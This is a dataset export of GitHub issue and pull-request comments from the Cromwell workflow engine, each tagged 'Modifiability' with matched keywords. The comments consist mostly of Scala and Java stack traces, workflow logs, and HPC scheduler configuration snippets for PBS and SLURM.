Modifiability,"/gdc-dnaseq-cwl/blob/master/workflows/dnaseq/transform.cwl:. ```; $ java -jar ~/bin/womtool-31.1.jar womgraph transform.cwl; Exception in thread ""main"" scala.MatchError: WomMaybePopulatedFileType (of class wom.types.WomMaybePopulatedFileType$); 	at womtool.graph.WomGraph$.fakeInput(WomGraph.scala:222); 	at womtool.graph.WomGraph$.$anonfun$womExecutableFromCwl$2(WomGraph.scala:205); 	at scala.collection.TraversableLike.$anonfun$map$1(TraversableLike.scala:234); 	at scala.collection.immutable.HashMap$HashMap1.foreach(HashMap.scala:231); 	at scala.collection.immutable.HashMap$HashTrieMap.foreach(HashMap.scala:462); 	at scala.collection.TraversableLike.map(TraversableLike.scala:234); 	at scala.collection.TraversableLike.map$(TraversableLike.scala:227); 	at scala.collection.AbstractTraversable.map(Traversable.scala:104); 	at womtool.graph.WomGraph$.$anonfun$womExecutableFromCwl$1(WomGraph.scala:205); 	at scala.util.Either.map(Either.scala:350); 	at womtool.graph.WomGraph$.womExecutableFromCwl(WomGraph.scala:201); 	at womtool.graph.WomGraph$.fromFiles(WomGraph.scala:172); 	at womtool.Main$.$anonfun$womGraph$2(Main.scala:98); 	at womtool.Main$.continueIf(Main.scala:102); 	at womtool.Main$.womGraph(Main.scala:96); 	at womtool.Main$.dispatchCommand(Main.scala:38); 	at womtool.Main$.delayedEndpoint$womtool$Main$1(Main.scala:167); 	at womtool.Main$delayedInit$body.apply(Main.scala:12); 	at scala.Function0.apply$mcV$sp(Function0.scala:34); 	at scala.Function0.apply$mcV$sp$(Function0.scala:34); 	at scala.runtime.AbstractFunction0.apply$mcV$sp(AbstractFunction0.scala:12); 	at scala.App.$anonfun$main$1$adapted(App.scala:76); 	at scala.collection.immutable.List.foreach(List.scala:389); 	at scala.App.main(App.scala:76); 	at scala.App.main$(App.scala:74); 	at womtool.Main$.main(Main.scala:12); 	at womtool.Main.main(Main.scala); ```. It would also be nice if the documentation included the fact that [`cwltool`](https://github.com/common-workflow-language/cwltool) needs to be installed.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4119#issuecomment-584388032:1798,adapt,adapted,1798,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4119#issuecomment-584388032,1,['adapt'],['adapted']
Modifiability,"002b46#617869376] was not delivered. [1] dead letters encountered. This logging can be turned off or adjusted with configuration settings 'akka.log-dead-letters' and 'akka.log-dead-letters-during-shutdown'.; [2017-01-20 09:33:07,58] [error] WorkflowManagerActor Workflow 814c47aa-9d11-4c81-a08c-f2b77c002b46 failed (during ExecutingWorkflowState): Call aggregate_mafs_workflow.aggregate_mafs:NA:1: return code was 1; java.lang.RuntimeException: Call aggregate_mafs_workflow.aggregate_mafs:NA:1: return code was 1; 	at cromwell.backend.standard.StandardAsyncExecutionActor$class.handleExecutionResult(StandardAsyncExecutionActor.scala:432); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.handleExecutionResult(ConfigAsyncJobExecutionActor.scala:113); 	at cromwell.backend.standard.StandardAsyncExecutionActor$class.handlePollSuccess(StandardAsyncExecutionActor.scala:370); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.handlePollSuccess(ConfigAsyncJobExecutionActor.scala:113); 	at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$poll$2.apply(StandardAsyncExecutionActor.scala:333); 	at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$poll$2.apply(StandardAsyncExecutionActor.scala:332); 	at scala.util.Success$$anonfun$map$1.apply(Try.scala:237); 	at scala.util.Try$.apply(Try.scala:192); 	at scala.util.Success.map(Try.scala:237); 	at scala.concurrent.Future$$anonfun$map$1.apply(Future.scala:237); 	at scala.concurrent.Future$$anonfun$map$1.apply(Future.scala:237); 	at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:32); 	at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); 	at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply$mcV$sp(BatchingExecutor.scala:91); 	at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91); 	at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExec",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1875#issuecomment-274088918:5512,Config,ConfigAsyncJobExecutionActor,5512,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1875#issuecomment-274088918,1,['Config'],['ConfigAsyncJobExecutionActor']
Modifiability,"1.JOB_SCATTER_INDEX IS NULL)); 	 AND (t2.JOB_RETRY_ATTEMPT = t1.JOB_RETRY_ATTEMPT OR (t2.JOB_RETRY_ATTEMPT IS NULL AND t1.JOB_RETRY_ATTEMPT IS NULL)); AND t2.METADATA_KEY LIKE CONCAT(TRIM(TRAILING ':message' FROM t1.METADATA_KEY), "":causedBy[%""); AND t2.METADATA_JOURNAL_ID <> t1.METADATA_JOURNAL_ID; )]; 	at liquibase.changelog.ChangeSet.execute(ChangeSet.java:619); 	at liquibase.changelog.visitor.UpdateVisitor.visit(UpdateVisitor.java:51); 	at liquibase.changelog.ChangeLogIterator.run(ChangeLogIterator.java:79); 	at liquibase.Liquibase.update(Liquibase.java:214); 	at liquibase.Liquibase.update(Liquibase.java:192); 	at cromwell.database.migration.liquibase.LiquibaseUtils$.updateSchema(LiquibaseUtils.scala:62); 	at cromwell.database.migration.liquibase.LiquibaseUtils$.updateSchema(LiquibaseUtils.scala:34); 	at cromwell.services.ServicesStore$EnhancedSqlDatabase$.$anonfun$initialized$1(ServicesStore.scala:11); 	at cromwell.services.ServicesStore$EnhancedSqlDatabase$.$anonfun$initialized$1$adapted(ServicesStore.scala:11); 	at cromwell.database.slick.SlickDatabase.$anonfun$withConnection$1(SlickDatabase.scala:155); 	at slick.jdbc.SimpleJdbcAction.run(StreamingInvokerAction.scala:70); 	at slick.jdbc.SimpleJdbcAction.run(StreamingInvokerAction.scala:69); 	at slick.basic.BasicBackend$DatabaseDef$$anon$2.liftedTree1$1(BasicBackend.scala:275); 	at slick.basic.BasicBackend$DatabaseDef$$anon$2.run(BasicBackend.scala:275); 	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149); 	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624); 	at java.lang.Thread.run(Thread.java:748); Caused by: liquibase.exception.DatabaseException: Unknown column ':causedBy[]' in 'field list' [Failed SQL: INSERT INTO METADATA_ENTRY (WORKFLOW_EXECUTION_UUID, METADATA_KEY, CALL_FQN, JOB_SCATTER_INDEX, JOB_RETRY_ATTEMPT, METADATA_TIMESTAMP); SELECT t1.WORKFLOW_EXECUTION_UUID, CONCAT(TRIM(TRAILING ':message' FROM t1.METADATA_KEY), "":causedBy[]""), t1.C",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4606#issuecomment-459609701:3686,adapt,adapted,3686,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4606#issuecomment-459609701,1,['adapt'],['adapted']
Modifiability,"17-01-20 09:33:07,58] [info] Message [cromwell.subworkflowstore.SubWorkflowStoreActor$SubWorkflowStoreCompleteSuccess] from Actor[akka://cromwell-system/user/SingleWorkflowRunnerActor/$b#-910401033] to Actor[akka://cromwell-system/user/SingleWorkflowRunnerActor/WorkflowManagerActor/WorkflowActor-814c47aa-9d11-4c81-a08c-f2b77c002b46#617869376] was not delivered. [1] dead letters encountered. This logging can be turned off or adjusted with configuration settings 'akka.log-dead-letters' and 'akka.log-dead-letters-during-shutdown'.; [2017-01-20 09:33:07,58] [error] WorkflowManagerActor Workflow 814c47aa-9d11-4c81-a08c-f2b77c002b46 failed (during ExecutingWorkflowState): Call aggregate_mafs_workflow.aggregate_mafs:NA:1: return code was 1; java.lang.RuntimeException: Call aggregate_mafs_workflow.aggregate_mafs:NA:1: return code was 1; 	at cromwell.backend.standard.StandardAsyncExecutionActor$class.handleExecutionResult(StandardAsyncExecutionActor.scala:432); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.handleExecutionResult(ConfigAsyncJobExecutionActor.scala:113); 	at cromwell.backend.standard.StandardAsyncExecutionActor$class.handlePollSuccess(StandardAsyncExecutionActor.scala:370); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.handlePollSuccess(ConfigAsyncJobExecutionActor.scala:113); 	at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$poll$2.apply(StandardAsyncExecutionActor.scala:333); 	at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$poll$2.apply(StandardAsyncExecutionActor.scala:332); 	at scala.util.Success$$anonfun$map$1.apply(Try.scala:237); 	at scala.util.Try$.apply(Try.scala:192); 	at scala.util.Success.map(Try.scala:237); 	at scala.concurrent.Future$$anonfun$map$1.apply(Future.scala:237); 	at scala.concurrent.Future$$anonfun$map$1.apply(Future.scala:237); 	at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:32); 	at akka.dispatch.BatchingExecutor$AbstractBatch.pr",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1875#issuecomment-274088918:5187,config,config,5187,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1875#issuecomment-274088918,1,['config'],['config']
Modifiability,"172); at akka.actor.Actor.aroundReceive(Actor.scala:517); at akka.actor.Actor.aroundReceive$(Actor.scala:515); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.aroundReceive(ConfigAsyncJobExecutionActor.scala:211); at akka.actor.ActorCell.receiveMessage(ActorCell.scala:588); at akka.actor.ActorCell.invoke(ActorCell.scala:557); at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:258); at akka.dispatch.Mailbox.run(Mailbox.scala:225); at akka.dispatch.Mailbox.exec(Mailbox.scala:235); at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: scala.NotImplementedError: This should not happen, please report this; at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.pollStatus(ConfigAsyncJobExecutionActor.scala:281); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.pollStatus(ConfigAsyncJobExecutionActor.scala:211); at cromwell.backend.standard.StandardAsyncExecutionActor.$anonfun$pollStatusAsync$1(StandardAsyncExecutionActor.scala:691); at scala.util.Try$.apply(Try.scala:209); ... 25 more; ```; This is our configuration for PBS:; ```; PBSPRO {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {; ; runtime-attributes = """"""; Int cpu = 1; Int memory_mb = 2048; String queue = ""normal""; String account = """"; String walltime = ""48:00:00""; ; Int? cpuMin; Int? cpuMax; Int? memoryMin; Int? memoryMax; String? outDirMin; String? outDirMax; String? tmpDirMin; String? tmpDirMax; """"""; submit = """"""; qsub -V -l wd -N ${job_name} -o ${out} -e ${err} -q ${queue} -l walltime=${walltime} -l ncpus=${cpu} -l mem=${memory_mb}mb -- /usr/bin/env bash ${script}; """"""; kill = ""qdel ${job_id}""; check-alive = ""qstat -j ${job_i",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4560#issuecomment-455621345:3949,Config,ConfigAsyncJobExecutionActor,3949,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4560#issuecomment-455621345,1,['Config'],['ConfigAsyncJobExecutionActor']
Modifiability,"2467800@1088569555438'."",; ""reason"" : ""rateLimitExceeded""; } ],; ""message"" : ""Insufficient tokens for quota group and limit 'defaultUSER-100s' of service 'staging-genomics.sandbox.googleapis.com', using the limit by ID '628662467800@1088569555438'."",; ""status"" : ""RESOURCE_EXHAUSTED""; }; 2016-12-08 16:14:28,581 cromwell-system-akka.dispatchers.engine-dispatcher-145 INFO - WorkflowExecutionActor-0545f731-803b-4194-a74e-44cc5c208ce4 [UUID(0545f731)]: Retrying job execution for PairedEndSingleSampleWorkflow.SamToFastqAndBwaMem:5:2; 2016-12-08 16:14:28,585 cromwell-system-akka.dispatchers.engine-dispatcher-145 INFO - WorkflowExecutionActor-0545f731-803b-4194-a74e-44cc5c208ce4 [UUID(0545f731)]: Starting calls: PairedEndSingleSampleWorkflow.SamToFastqAndBwaMem:5:2; ```. and this is one that was not pre-emptible(is my guess based on metadata from the workflow, only one task is ""failed"" in that workflow); ```; 2016-12-08 16:14:36,602 cromwell-system-akka.dispatchers.engine-dispatcher-289 ERROR - WorkflowManagerActor Workflow 0545f731-803b-4194-a74e-44cc5c208ce4 failed (during ExecutingWorkflowState): cromwell.core.package$CromwellFatalException: cromwell.core.package$CromwellFatalException: com.google.api.client.googleapis.json.GoogleJsonResponseException: 429 Too Many Requests; {; ""code"" : 429,; ""errors"" : [ {; ""domain"" : ""global"",; ""message"" : ""Insufficient tokens for quota group and limit 'defaultUSER-100s' of service 'staging-genomics.sandbox.googleapis.com', using the limit by ID '628662467800@1088569555438'."",; ""reason"" : ""rateLimitExceeded""; } ],; ""message"" : ""Insufficient tokens for quota group and limit 'defaultUSER-100s' of service 'staging-genomics.sandbox.googleapis.com', using the limit by ID '628662467800@1088569555438'."",; ""status"" : ""RESOURCE_EXHAUSTED""; }; 2016-12-08 16:14:36,604 cromwell-system-akka.dispatchers.engine-dispatcher-89 INFO - WorkflowManagerActor WorkflowActor-0545f731-803b-4194-a74e-44cc5c208ce4 is in a terminal state: WorkflowFailedState; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1763#issuecomment-271640490:2204,sandbox,sandbox,2204,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1763#issuecomment-271640490,2,['sandbox'],['sandbox']
Modifiability,"37 commits? :confused: I think a rebase on a rebase went bad. I've had to use `git cherry-pick` recently to get the actual commits I want to land on top of the shifting `job_avoidance` branch. @mcovarr Your changes don't seem to have the same effect that my playing around did, where my ""hacks"" changed the `Future` behavior, because of the very crafty `EnhancedFuture[A](val future: Future[Future[A]])`.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/322#issuecomment-164905674:354,Enhance,EnhancedFuture,354,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/322#issuecomment-164905674,1,['Enhance'],['EnhancedFuture']
Modifiability,5); 	at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.writeScriptContents$(SharedFileSystemAsyncJobExecutionActor.scala:174); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.cromwell$backend$sfs$BackgroundAsyncJobExecutionActor$$super$writeScriptContents(ConfigAsyncJobExecutionActor.scala:200); 	at cromwell.backend.sfs.BackgroundAsyncJobExecutionActor.writeScriptContents(BackgroundAsyncJobExecutionActor.scala:12); 	at cromwell.backend.sfs.BackgroundAsyncJobExecutionActor.writeScriptContents$(BackgroundAsyncJobExecutionActor.scala:11); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.writeScriptContents(ConfigAsyncJobExecutionActor.scala:200); 	at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.execute(SharedFileSystemAsyncJobExecutionActor.scala:158); 	at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.execute$(SharedFileSystemAsyncJobExecutionActor.scala:155); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.execute(ConfigAsyncJobExecutionActor.scala:200); 	at cromwell.backend.standard.StandardAsyncExecutionActor.$anonfun$executeAsync$1(StandardAsyncExecutionActor.scala:644); 	at scala.util.Try$.apply(Try.scala:209); 	at cromwell.backend.standard.StandardAsyncExecutionActor.executeAsync(StandardAsyncExecutionActor.scala:644); 	at cromwell.backend.standard.StandardAsyncExecutionActor.executeAsync$(StandardAsyncExecutionActor.scala:644); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.executeAsync(ConfigAsyncJobExecutionActor.scala:200); 	at cromwell.backend.standard.StandardAsyncExecutionActor.executeOrRecover(StandardAsyncExecutionActor.scala:959); 	at cromwell.backend.standard.StandardAsyncExecutionActor.executeOrRecover$(StandardAsyncExecutionActor.scala:951); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.executeOrRecover(ConfigAsyncJobExecutionActor.scala:200); 	at cromwell.backend.async.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4725#issuecomment-472514211:2333,config,config,2333,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4725#issuecomment-472514211,1,['config'],['config']
Modifiability,"79] [info] BackgroundConfigAsyncJobExecutionActor [814c47aaaggregate_mafs_workflow.aggregate_mafs:NA:1]: BackgroundConfigAsyncJobExecutionActor [814c47aa:aggregate_mafs_workflow.aggregate_mafs:NA:1] Status change from - to SharedFileSystemRunStatus(false); [2017-01-20 09:33:07,55] [info] BackgroundConfigAsyncJobExecutionActor [814c47aaaggregate_mafs_workflow.aggregate_mafs:NA:1]: BackgroundConfigAsyncJobExecutionActor [814c47aa:aggregate_mafs_workflow.aggregate_mafs:NA:1] Status change from SharedFileSystemRunStatus(false) to SharedFileSystemRunStatus(true); [2017-01-20 09:33:07,58] [info] Message [cromwell.subworkflowstore.SubWorkflowStoreActor$SubWorkflowStoreCompleteSuccess] from Actor[akka://cromwell-system/user/SingleWorkflowRunnerActor/$b#-910401033] to Actor[akka://cromwell-system/user/SingleWorkflowRunnerActor/WorkflowManagerActor/WorkflowActor-814c47aa-9d11-4c81-a08c-f2b77c002b46#617869376] was not delivered. [1] dead letters encountered. This logging can be turned off or adjusted with configuration settings 'akka.log-dead-letters' and 'akka.log-dead-letters-during-shutdown'.; [2017-01-20 09:33:07,58] [error] WorkflowManagerActor Workflow 814c47aa-9d11-4c81-a08c-f2b77c002b46 failed (during ExecutingWorkflowState): Call aggregate_mafs_workflow.aggregate_mafs:NA:1: return code was 1; java.lang.RuntimeException: Call aggregate_mafs_workflow.aggregate_mafs:NA:1: return code was 1; 	at cromwell.backend.standard.StandardAsyncExecutionActor$class.handleExecutionResult(StandardAsyncExecutionActor.scala:432); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.handleExecutionResult(ConfigAsyncJobExecutionActor.scala:113); 	at cromwell.backend.standard.StandardAsyncExecutionActor$class.handlePollSuccess(StandardAsyncExecutionActor.scala:370); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.handlePollSuccess(ConfigAsyncJobExecutionActor.scala:113); 	at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$po",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1875#issuecomment-274088918:4632,config,configuration,4632,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1875#issuecomment-274088918,1,['config'],['configuration']
Modifiability,"7:48:55,34] [info] Running migration RenameWorkflowOptionsInMetadata with a read batch size of 100000 and a write batch size of 100000; [2018-10-23 17:48:55,36] [info] [RenameWorkflowOptionsInMetadata] 100%; [2018-10-23 17:48:55,49] [info] Running with database db.url = jdbc:hsqldb:mem:35603602-72c4-4c47-8662-7fdf49e59cf1;shutdown=false;hsqldb.tx=mvcc; [2018-10-23 17:48:55,95] [info] Slf4jLogger started; [2018-10-23 17:48:56,03] [info] Pre Processing Workflow...; [2018-10-23 17:48:56,20] [info] Pre-Processing /home/jeremiah/code/gdc-dnaseq-cwl/workflows/bamfastq_align/test_pack.cwl; [2018-10-23 17:49:21,60] [info] Pre Processing Inputs...; [2018-10-23 17:49:21,78] [info] Workflow heartbeat configuration:; {; ""cromwellId"" : ""cromid-5deb9cb"",; ""heartbeatInterval"" : ""2 minutes"",; ""ttl"" : ""10 minutes"",; ""writeBatchSize"" : 10000,; ""writeThreshold"" : 10000; }; [2018-10-23 17:49:21,93] [info] Metadata summary refreshing every 2 seconds.; [2018-10-23 17:49:22,12] [info] KvWriteActor configured to flush with batch size 200 and process rate 5 seconds.; [2018-10-23 17:49:22,13] [info] WriteMetadataActor configured to flush with batch size 200 and process rate 5 seconds.; [2018-10-23 17:49:22,22] [info] CallCacheWriteActor configured to flush with batch size 100 and process rate 3 seconds.; [2018-10-23 17:49:23,62] [info] JobExecutionTokenDispenser - Distribution rate: 50 per 1 seconds.; [2018-10-23 17:49:23,67] [info] SingleWorkflowRunnerActor: Version 37-634ac5b-SNAP; [2018-10-23 17:49:23,68] [info] SingleWorkflowRunnerActor: Submitting workflow; [2018-10-23 17:49:23,76] [info] CWL (v1.0) workflow d186ca94-b85b-4729-befc-8ad28a05976c submitted; [2018-10-23 17:49:23,80] [info] SingleWorkflowRunnerActor: Workflow submitted d186ca94-b85b-4729-befc-8ad28a05976c; [2018-10-23 17:49:23,80] [info] 1 new workflows fetched; [2018-10-23 17:49:23,81] [info] WorkflowManagerActor Starting workflow d186ca94-b85b-4729-befc-8ad28a05976c; [2018-10-23 17:49:23,83] [info] WorkflowManagerActor Su",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4103#issuecomment-432449856:2844,config,configured,2844,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4103#issuecomment-432449856,1,['config'],['configured']
Modifiability,"8972337ce9/cromwell.example.backends/LocalExample.conf)). Maybe the problem could have been solved by also replacing `$stdoutRedirection` and `$stderrRedirection` with something like `$stdoutRedirectionTmp` and `$stderrRedirectionTmp` and then replace:; ```; mv $rcTmpPath $rcPath; ```; with:; ```; mv $stdoutRedirectionTmp $stdoutRedirection; mv $stderrRedirectionTmp $stderrRedirection; mv $rcTmpPath $rcPath; ```; This way `stdout` and `stderr` would have been created in the NFS filesystem at the same time as the `rc` file and would increase the likelihood that they would all have been synced at the same time. However, this would not give the intended behavior when running in Google Cloud. Another problem that I have noticed is that there are multiple places in the Cromwell documentation that advise, when running Cromwell with SLURM, to use configurations such as (see [here](https://cromwell.readthedocs.io/en/stable/tutorials/Containers/#configuration)):; ```; sbatch \; -o ${cwd}/execution/stdout \; -e ${cwd}/execution/stderr \; ```; or as (see [here](https://cromwell.readthedocs.io/en/stable/tutorials/HPCSlurmWithLocalScratch/#e-now-add-the-following-text-after-line-479-ie-after-the-line-reading-default-slurm-ensure-that-the-lines-that-show-line-breaks-in-this-document-are-in-fact-single-lines-in-referenceconf), or [here](https://cromwell.readthedocs.io/en/stable/backends/SLURM/), or [here](https://cromwell.readthedocs.io/en/stable/tutorials/HPCSlurmWithLocalScratch/#configure-the-execution-environment-for-cromwell), or [here](https://github.com/broadinstitute/cromwell/blob/8a1297fb0e44a11421eed98c5885188972337ce9/cromwell.example.backends/slurm.conf)); ```; sbatch \; -o ${out} \; -e ${err} \; ```; which overwrites `stdout` and `stderr` written by the `script` file, which seems inappropriate. The following should have been used instead:; ```; sbatch \; -o ${out}.sbatch \; -e ${err}.sbatch \; ```; Similarly to how it is advised for [SGE](https://cromwell.readthedocs.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7094#issuecomment-1622071956:3011,config,configuration,3011,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7094#issuecomment-1622071956,1,['config'],['configuration']
Modifiability,"8] [info] DispatchedConfigAsyncJobExecutionActor [bc35173dmyWorkflow.myTask:NA:1]: Status change from - to Running; [2019-02-13 22:18:20,81] [warn] DispatchedConfigAsyncJobExecutionActor [bc35173dmyWorkflow.myTask:NA:1]: Fatal exception polling for status. Job will fail.; java.util.concurrent.ExecutionException: Boxed Error; 	at scala.concurrent.impl.Promise$.resolver(Promise.scala:83); 	at scala.concurrent.impl.Promise$.scala$concurrent$impl$Promise$$resolveTry(Promise.scala:75); 	at scala.concurrent.impl.Promise$KeptPromise$.apply(Promise.scala:402); 	at scala.concurrent.Promise$.fromTry(Promise.scala:138); 	at scala.concurrent.Future$.fromTry(Future.scala:635); 	at cromwell.backend.standard.StandardAsyncExecutionActor.pollStatusAsync(StandardAsyncExecutionActor.scala:697); 	at cromwell.backend.standard.StandardAsyncExecutionActor.pollStatusAsync$(StandardAsyncExecutionActor.scala:697); 	at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.pollStatusAsync(ConfigAsyncJobExecutionActor.scala:211); 	at cromwell.backend.standard.StandardAsyncExecutionActor.poll(StandardAsyncExecutionActor.scala:989); 	at cromwell.backend.standard.StandardAsyncExecutionActor.poll$(StandardAsyncExecutionActor.scala:983); 	at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.poll(ConfigAsyncJobExecutionActor.scala:211); 	at cromwell.backend.async.AsyncBackendJobExecutionActor.$anonfun$robustPoll$1(AsyncBackendJobExecutionActor.scala:76); 	at cromwell.core.retry.Retry$.withRetry(Retry.scala:38); 	at cromwell.backend.async.AsyncBackendJobExecutionActor.withRetry(AsyncBackendJobExecutionActor.scala:61); 	at cromwell.backend.async.AsyncBackendJobExecutionActor.cromwell$backend$async$AsyncBackendJobExecutionActor$$robustPoll(AsyncBackendJobExecutionActor.scala:76); 	at cromwell.backend.async.AsyncBackendJobExecutionActor$$anonfun$receive$1.applyOrElse(AsyncBackendJobExecutionActor.scala:89); 	at scala.PartialFunction$OrElse.applyOrElse(PartialFunctio",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4560#issuecomment-463475710:1285,Config,ConfigAsyncJobExecutionActor,1285,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4560#issuecomment-463475710,1,['Config'],['ConfigAsyncJobExecutionActor']
Modifiability,93 cromwell-system-akka.actor.default-dispatcher-29 ERROR - No configuration setting found for key 'services'; akka.actor.ActorInitializationException: akka://cromwell-system/user/cromwell-service/ServiceRegistryActor: exception during creation; 	at akka.actor.ActorInitializationException$.apply(Actor.scala:193); 	at akka.actor.ActorCell.create(ActorCell.scala:669); 	at akka.actor.ActorCell.invokeAll$1(ActorCell.scala:523); 	at akka.actor.ActorCell.systemInvoke(ActorCell.scala:545); 	at akka.dispatch.Mailbox.processAllSystemMessages(Mailbox.scala:283); 	at akka.dispatch.Mailbox.run(Mailbox.scala:224); 	at akka.dispatch.Mailbox.exec(Mailbox.scala:235); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: com.typesafe.config.ConfigException$Missing: No configuration setting found for key 'services'; 	at com.typesafe.config.impl.SimpleConfig.findKeyOrNull(SimpleConfig.java:156); 	at com.typesafe.config.impl.SimpleConfig.findOrNull(SimpleConfig.java:174); 	at com.typesafe.config.impl.SimpleConfig.find(SimpleConfig.java:188); 	at com.typesafe.config.impl.SimpleConfig.find(SimpleConfig.java:193); 	at com.typesafe.config.impl.SimpleConfig.getObject(SimpleConfig.java:268); 	at com.typesafe.config.impl.SimpleConfig.getObject(SimpleConfig.java:41); 	at cromwell.services.ServiceRegistryActor$.serviceNameToPropsMap(ServiceRegistryActor.scala:35); 	at cromwell.services.ServiceRegistryActor.serviceProps(ServiceRegistryActor.scala:63); 	at cromwell.services.ServiceRegistryActor.<init>(ServiceRegistryActor.scala:65); 	at cromwell.services.ServiceRegistryActor$.$anonfun$props$1(ServiceRegistryActor.scala:25); 	at akka.actor.TypedCreatorFunctionConsumer.produce(IndirectActorProducer.scala:87); 	at akka.actor.Props.newA,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4676#issuecomment-467132881:1079,config,config,1079,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4676#issuecomment-467132881,1,['config'],['config']
Modifiability,":+1: It seems there's a potential to reduce some of the boilerplate around instances dealing with `ExpressionElement`. It seems like those instances exist to refine the type down to the ""leaf"" level where the more specific type can do its thing. I would try to eliminate one of these and see if you can parameterize the callers with a `[T]` or `[T <: ExpressionElement]` to save you from the trouble of specializing/refining/narrowing/casting (not sure the right word) the type yourself. [![Approved with PullApprove](https://img.shields.io/badge/one_reviewer-approved-brightgreen.svg)](https://pullapprove.com/broadinstitute/cromwell/pull-request/3413/?utm_source=github-pr&utm_medium=comment-badge&utm_campaign=broadinstitute/cromwell) [![Approved with 